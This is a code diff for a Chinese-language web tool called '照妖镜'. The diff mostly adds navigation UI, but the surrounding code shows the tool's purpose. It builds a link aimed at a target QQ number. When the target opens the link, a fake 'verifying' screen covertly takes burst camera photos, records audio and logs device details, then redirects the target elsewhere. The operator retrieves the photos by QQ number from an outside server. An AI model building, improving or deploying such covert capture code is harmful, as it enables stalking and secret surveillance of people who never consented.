@@ -2,8 +2,8 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>加载中</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>照妖镜</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -14,7 +14,7 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 20px 20px 90px 20px;
         }
         .config-container { max-width: 600px; width:100%; }
         .card {
@@ -23,12 +23,11 @@
         }
         .card-header { text-align:center; margin-bottom:24px; }
         .card-header .icon {
-            width: 52px;
-            height: 52px;
+            width: 80px;
+            height: 80px;
             object-fit: contain;
-            vertical-align: middle;
-            margin-bottom: 8px;
-            border-radius: 12px;
+            border-radius: 16px;
+            margin-bottom: 12px;
         }
         .card-header h1 {
             font-size:26px;
@@ -42,13 +41,18 @@
             border:1.5px solid #2a2a35; border-radius:8px; color:#e0e0e0;
             font-size:15px; outline:none;
         }
+        .form-group input:focus, .form-group select:focus {
+            border-color:#6c5ce7;
+        }
         .checkbox-group { display:flex; align-items:center; gap:10px; }
         .checkbox-group input[type="checkbox"] { width:auto; }
         .btn {
             width:100%; padding:14px; background:#6c5ce7; color:#fff;
             border:none; border-radius:8px; font-size:16px; cursor:pointer;
             margin-bottom:10px;
+            transition: opacity 0.2s;
         }
+        .btn:active { opacity:0.7; }
         .btn-secondary { background:#2ecc71; }
         .result-area {
             display:none; margin-top:20px; padding:18px;
@@ -58,6 +62,7 @@
         .result-area input {
             width:100%; padding:10px; background:#1a1a24;
             border:1px solid #2a2a35; border-radius:6px; color:#7ecbff;
+            font-size:13px;
         }
         .btn-copy {
             padding:10px 16px; background:#2ecc71; color:#fff;
@@ -77,6 +82,32 @@
             border:1px solid rgba(231,76,60,0.25);
             border-radius:8px; font-size:12px; color:#e98b82;
         }
+
+        /* ========== 页面切换 ========== */
+        .page { display:none; }
+        .page.active { display:block; }
+
+        /* ========== Dock 底部导航栏 ========== */
+        .dock-bar {
+            position:fixed; bottom:0; left:0; right:0;
+            background:#13131a; border-top:1px solid #2a2a35;
+            display:flex; justify-content:space-around; align-items:center;
+            padding:8px 0 env(safe-area-inset-bottom, 8px) 0;
+            max-width:600px; margin:0 auto;
+            z-index:1000;
+        }
+        .dock-item {
+            display:flex; flex-direction:column; align-items:center;
+            gap:2px; padding:6px 20px; border-radius:8px;
+            background:transparent; border:none; color:#666;
+            cursor:pointer; transition:color 0.2s;
+            font-size:11px;
+        }
+        .dock-item .dock-icon { font-size:24px; line-height:1.2; }
+        .dock-item .dock-label { font-size:11px; color:#666; }
+        .dock-item.active .dock-label { color:#6c5ce7; }
+        .dock-item.active .dock-icon { filter:drop-shadow(0 0 6px rgba(108,92,231,0.4)); }
+        .dock-item:active { transform:scale(0.92); }
 
         /* 追踪页 */
         .track-overlay {
@@ -107,61 +138,84 @@
 </head>
 <body>
 
-<!-- ==================== 主页（配置模式） ==================== -->
+<!-- ==================== 主容器 ==================== -->
 <div id="configMode" class="config-container">
-    <div class="card">
-        <div class="card-header">
-            <img class="icon" src="3.png" alt="照妖镜图标">
-            <h1>言出法随·照妖镜</h1>
-            <p style="color:#a0a0b0;font-size:13px;">生成链接 · 拍照 · 连拍 · 录音</p>
+
+    <!-- ===== 页面：主页 ===== -->
+    <div class="page active" id="pageHome">
+        <div class="card">
+            <div class="card-header">
+                <img class="icon" src="3.png" alt="照妖镜图标">
+                <h1>言出法随·照妖镜</h1>
+                <p style="color:#a0a0b0;font-size:13px;">生成链接 · 拍照 · 连拍 · 录音</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="form-group">
+                <label>QQ号 <span style="color:#e74c3c;">*</span></label>
+                <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
+            </div>
+            <div class="form-group">
+                <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
+                <input type="url" id="urlInput" placeholder="https://example.com">
+            </div>
+
+            <div class="form-group">
+                <label>连拍张数</label>
+                <input type="number" id="burstInput" value="1" min="1" max="10" step="1">
+                <div style="font-size:11px;color:#666;margin-top:4px;">目标打开后自动连续拍摄的照片数量（1-10张）</div>
+            </div>
+            <div class="form-group checkbox-group">
+                <input type="checkbox" id="audioCheck" checked>
+                <label for="audioCheck" style="margin:0;">同时录制一段语音</label>
+            </div>
+
+            <button class="btn" onclick="generateLink()">🔗 生成链接</button>
+
+            <div class="result-area" id="resultArea">
+                <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 链接已生成</div>
+                <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
+                <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制链接</button>
+            </div>
+
+            <div class="warning-box">
+                ⚠️ 对方需为安卓系统并使用非Edge、火狐等浏览器，系统自带浏览器即可，QQ微信也可以
+            </div>
         </div>
     </div>
 
-        <div class="form-group">
-            <label>QQ号 <span style="color:#e74c3c;">*</span></label>
-            <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
-        </div>
-        <div class="form-group">
-            <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
-            <input type="url" id="urlInput" placeholder="https://example.com">
-        </div>
-
-        <div class="form-group">
-            <label>连拍张数</label>
-            <input type="number" id="burstInput" value="1" min="1" max="10" step="1">
-            <div style="font-size:11px;color:#666;margin-top:4px;">目标打开后自动连续拍摄的照片数量（1-10张）</div>
-        </div>
-        <div class="form-group checkbox-group">
-            <input type="checkbox" id="audioCheck" checked>
-            <label for="audioCheck" style="margin:0;">同时录制一段语音</label>
+    <!-- ===== 页面：查询 ===== -->
+    <div class="page" id="pageQuery">
+        <div class="card">
+            <div class="card-header">
+                <span style="font-size:52px;">📁</span>
+                <h1 style="font-size:22px;background:linear-gradient(135deg,#e0e0e0,#a0a0c0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">查询照片</h1>
+                <p style="color:#a0a0b0;font-size:13px;">输入QQ号查看已拍摄的照片</p>
+            </div>
         </div>
 
-        <button class="btn" onclick="generateLink()">🔗 生成链接</button>
-
-        <div class="result-area" id="resultArea">
-            <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 链接</div>
-            <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
-            <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
-        </div>
-
-        <div class="warning-box">
-            ⚠️ 对方需未安卓系统并使用非Eage，火狐等浏览器，系统自带的就是不错的选择，QQ微信也可以
+        <div class="card">
+            <div class="form-group">
+                <label>输入QQ号查询</label>
+                <input type="text" id="queryQQ" placeholder="输入QQ号">
+            </div>
+            <button class="btn btn-secondary" onclick="queryPhotos()">🔍 查询照片</button>
+            <div id="photoResult" style="margin-top:15px;"></div>
         </div>
     </div>
+</div>
 
-    <!-- 查询照片 -->
-    <div class="card">
-        <div class="card-header">
-            <span class="icon" style="font-size:36px;">📁</span>
-            <h2 style="font-size:18px;">查询已拍摄照片</h2>
-        </div>
-        <div class="form-group">
-            <label>输入QQ号查询</label>
-            <input type="text" id="queryQQ" placeholder="输入QQ号">
-        </div>
-        <button class="btn btn-secondary" onclick="queryPhotos()">🔍 查询照片</button>
-        <div id="photoResult" style="margin-top:15px;"></div>
-    </div>
+<!-- ==================== Dock 底部导航 ==================== -->
+<div class="dock-bar" id="dockBar">
+    <button class="dock-item active" data-page="pageHome">
+        <span class="dock-icon">🏠</span>
+        <span class="dock-label">主页</span>
+    </button>
+    <button class="dock-item" data-page="pageQuery">
+        <span class="dock-icon">📁</span>
+        <span class="dock-label">查询</span>
+    </button>
 </div>
 
 <!-- ==================== 追踪模式 ==================== -->
@@ -182,6 +236,20 @@
 
 <script>
 const $ = id => document.getElementById(id);
+
+// ========== Dock 导航切换 ==========
+document.querySelectorAll('.dock-item').forEach(item => {
+    item.addEventListener('click', function() {
+        // 切换 Dock 激活状态
+        document.querySelectorAll('.dock-item').forEach(i => i.classList.remove('active'));
+        this.classList.add('active');
+
+        // 切换页面
+        const pageId = this.dataset.page;
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        $(pageId).classList.add('active');
+    });
+});
 
 // ========== 主页功能 ==========
 function generateLink() {
@@ -216,7 +284,7 @@ async function queryPhotos() {
     const qq = $('queryQQ').value.trim();
     if (!qq) return alert('请输入QQ号');
     const resultDiv = $('photoResult');
-    resultDiv.innerHTML = '查询中...';
+    resultDiv.innerHTML = '<div style="color:#888;">查询中...</div>';
 
     try {
         const resp = await fetch(`http://a1nb66.atwebpages.com/zyj/api.php?action=list_images&qq=${qq}`);
@@ -244,6 +312,7 @@ async function queryPhotos() {
 // ========== 追踪页功能 ==========
 function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
     $('configMode').style.display = 'none';
+    $('dockBar').style.display = 'none';
     $('trackMode').style.display = 'flex';
 
     const spinner = $('spinner');
@@ -273,7 +342,6 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         statusText.style.color = isErr ? '#e74c3c' : '#aaa';
     }
 
-    // 真实信息日志
     const ua = navigator.userAgent;
     const platform = navigator.platform || 'unknown';
     const screenW = window.screen.width, screenH = window.screen.height;
@@ -347,7 +415,6 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         cvs.height = vid.videoHeight;
         const ctx = cvs.getContext('2d');
 
-        // 连拍
         for (let i = 0; i < burstCount; i++) {
             setStatus(`验证中.. (${i+1}/${burstCount})...`);
             ctx.drawImage(vid, 0, 0);
@@ -372,7 +439,6 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
             if (i < burstCount - 1) await sleep(500);
         }
 
-        // 录音（如果启用）
         if (audioEnabled && stream.getAudioTracks().length > 0) {
             setStatus('准备...');
             pushLog('Recording audio (3s)...');
@@ -438,6 +504,7 @@ if (qq && url) {
     startTrack(qq, decodeURIComponent(url), burst, audio);
 } else {
     $('configMode').style.display = 'block';
+    $('dockBar').style.display = 'flex';
 }
 </script>
 </body>
